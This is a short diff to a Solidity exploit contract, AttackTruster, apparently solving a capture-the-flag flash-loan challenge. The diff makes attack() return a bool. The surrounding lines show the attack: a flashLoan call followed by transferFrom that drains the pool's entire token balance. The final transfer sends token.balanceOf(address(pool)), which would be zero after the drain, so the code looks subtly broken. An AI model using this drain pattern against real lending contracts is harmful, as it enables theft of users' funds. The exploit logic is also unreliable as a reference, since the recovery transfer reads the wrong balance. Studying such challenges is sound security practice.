@@ -15,7 +15,7 @@ contract AttackTruster {
         recovery = _recovery;
     }
 
-    function attack() external {
+    function attack() external returns(bool){
         require(
             pool.flashLoan(
                 0,
@@ -27,5 +27,7 @@ contract AttackTruster {
 
         require(token.transferFrom(address(pool), address(this), token.balanceOf(address(pool))));
         require(token.transfer(recovery, token.balanceOf(address(pool))));
+
+        return true;
     }
 }
